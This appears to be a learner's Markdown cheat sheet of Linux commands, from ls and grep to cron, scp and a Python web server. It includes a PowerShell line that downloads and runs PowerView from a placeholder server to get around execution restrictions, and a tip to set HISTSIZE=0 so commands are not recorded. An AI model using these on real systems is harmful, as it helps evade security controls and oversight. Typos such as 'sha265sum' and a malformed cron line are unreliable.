
# Linux commands
- ls
- whoami
- cd
- cat
- pwd
- echo
- `find / -name passwords.txt 2>/dev/null`
- `grep "text" file.txt`
- wc -l -b to count entries by byte or line etc.
- base64: for example `base64 -d data.txt` decodes the file content.
- man {command} or {command} --help
- touch	Create file
- mkdir	Create a folder
- cp Copy a file or folder
- mv Move a file or folder
- rm remove	Remove a file or folder
- file Determine the type of a file
- su to change user
- wget
  
- SCP (copy files with ssh)
  + `scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt` to copy a file important.txt from local machine to remote 192.168.1.30 and will be called transferred.txt.
  + `scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt` to copy a file called documents.txt from remote 192.168.1.30 to local machine and will be called notes.txt.
    
- Python `HTTPServer` turns your computer into a quick and easy web server that you can use to serve your own files, where they can then be downloaded by another computing using commands such as curl and wget.
  + `python3 -m http.server` is used to start an hhtp server in the directory where the command was run.
  + `wget http://{machineIP}:8000/{some file name}` is used to download some file from the webserver hosted on the {machineIP}.
  + on powershell, we can use tools that are not allowed to execute by loading them from the internet for example my linux server. after running the server in the folder where powerview.ps1 exists, we can use the following to load it: `iex (new-object net.webclient).downloadstring('http://{server-IP}/PowerView.ps1')`. then we can execute the commands of powerview.
- `ps` command is used to provide a list of the running processes as our user's session and some additional information. To see the processes run by other users and those that don't run from a session (i.e. system processes), we need to provide aux to the ps command like so: `ps aux`
  
- `top` gives you real-time statistics about the processes running on your system instead of a one-time view.

- To kill a process, we can use the appropriately named `kill` command and the associated PID that we wish to kill. ex: `kill 1337`. Below are some of the signals that we can send to a process when it is killed:
  - `SIGTERM` Kill the process, but allow it to do some cleanup tasks beforehand
  - `SIGKILL` Kill the process - doesn't do any cleanup after the fact
  - `SIGSTOP` Stop/suspend a process

- `systemctl [option] [service]` is used to interact with systemd process/daemon. ex: `systemctl start apache2`.

- With our process backgrounded using either Ctrl + Z or the & operator, we can use fg to bring this back to focus

- crontabs are files with specific formatting that can be recognised by `cron` process which is used to automate processes. 6 values are needed `MIN HOUR DOM MON DOW CMD`, ex: crontab file will have the command `0 *12 * * * cp -R /home/cmnatic/Documents /var/backups/` which is used to exceute the backup every 12 hours. `crontab -e` is used to add, edit, or delete a cron job.

- grep:
  + Count the Number of Lines Matching a Pattern: `-c`
  + Search for a Pattern and Display Only Matching Text: `-o`
  + Prints the line number of the matching line as well: `-n`
  + Search for a Pattern Recursively in Files within a Directory: `grep -r "pattern" directory/`
  + Search for a Pattern Ignoring Case Sensitivity: `-i`
    
- cut:
  + Extract the first column of each line in the file: `cut -f1 file.txt`
  + Extract a Specific Field from a Colon-Delimited File: `cut -d: -f3 file.txt`
  + Extract a Range of Characters from Each Line: `cut -c1-5 file.txt`
  + Extract Characters from a Specific Position to the End of Each Line: `cut -c6- file.txt`
  + Specify a Custom Delimiter: `cut -d',' -f2 file.csv`
  + Extract Multiple Columns: `cut -f1,3 file.txt`
  + Suppress Lines Without Delimiters: `cut -d',' -s -f2 file.csv`
    
- sort:
  + This command sorts the lines of the comma-delimited CSV file file.csv based on the second field: `sort -t',' -k2 file.csv`
  + Sort Lines of a File and Remove Duplicates: `sort -u file.txt`
  + reverse order: `-r`
  + sort numerically: `-n`

- shred: it is used to overwrite the specified file repeatedly so it would be hard to recover.
- we have the variable `$HISTSIZE` which points to the terminal history, we can `export HISTSIZE=0` to stop recording commands executed.
## Notes
- `sudo !!`: executes the previous command with root privilege.
- The operator & allows us to execute commands in the background.
- "&&" is used to make a list of commands to run for example command1 && command2
- ">>" is used to append, and > is used to override. ex: `echo text > file.txt`
- connect to ssh using command `ssh {username}@IP` or `ssh -i id_rsa username@host`
- to convert from base64: `base64 -d file > fileb`
- to find sha265 of a file in binary: `sha265sum fileb`
- to find the size of a file in bytes: `stat -c %s fileb`
